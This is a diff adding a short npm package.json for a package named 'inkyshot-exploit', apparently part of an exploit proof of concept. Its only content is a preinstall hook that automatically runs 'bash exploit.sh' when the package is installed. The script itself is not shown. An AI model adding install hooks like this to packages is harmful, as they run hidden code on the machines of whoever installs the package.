@@ -1,0 +1,7 @@
+{
+  "name": "inkyshot-exploit",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "bash exploit.sh"
+  }
+}
